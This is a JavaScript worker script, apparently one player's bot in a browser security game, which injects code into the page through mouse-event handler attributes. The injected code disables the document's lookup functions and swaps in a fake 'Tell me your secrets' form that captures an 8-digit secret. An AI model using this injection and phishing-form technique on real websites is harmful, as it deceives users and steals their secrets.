onmessage = function(e) {
    //console.log('player3 received', e.data);
    if (e.data && e.data.nodeName) {
        console.log("player 3 Maybe winning");
        x = e.data.nodeName.match("T([0-9]{8})");
        if (x) {
            console.log("player 3 Trying to capture", x);
            postMessage({
                'capture': {
                    'secret' : x[1],
                }
            });
        } else {
            console.log(e.data.nodeName + " does not match pattern");
        }

    }
}
input = 'Tell me your secrets...<form><input id="tricksy" type="text" name="secret" pattern="^[0-9]{8}$" title="Tell me your secrets..." oninput="pde_callback(this.value)" /></form>';

splicer = `
    d = document; 
    if (d.getElementById) {
        d.qs123 = d.querySelector; 
        d.ged123 = d.getElementById; 
        d.ce123 = d.createElement; 
        d.getElementById = d.createElement = null; 
        d.getElementsByClassName = d.getElementsByTagName = d.getElementsByTagNameNS = null;
        d.querySelectorAll = d.write = d.writeln = null;
        d.querySelector = function(x) {
            if (x == "#zoz123" || x == "html") {
                return d.qs123(x);
            } else {
                return null;
            }
        }
        if (!d.ged123("tricksy")) {
                d.qs123("html").innerHTML = '<head></head><body>`+input+`</body>'; 
                pde_callback = function(s) {
                    if (s.match("^[0-9]{8}$")) {
                        x = document.ce123("t"+s); 
                        x.setAttribute("id", "zoz123");
                        document.qs123("html").appendChild(x);
                        console.log("set message "+ x.getAttribute("name"));
                   }
                };
        }
    }
`;

var hook = {
    'setAttr': {
        'selector': 'html',
        'name': 'onmouseover',
        'value': splicer,
    }
}
//eval(splicer);


postMessage(hook);

var reader = {'selector': '#zoz123'};
hook.read = reader;
var evts = ["onmousemove","onpointermove"];
for (var i = 0; i < 2; i++) {
    hook.setAttr.name = evts[i];
    postMessage(hook);
}
var justRead = {
    "read": reader
}

function looper() {
    postMessage(hook);
    setTimeout(looper, 100);
}

looper();


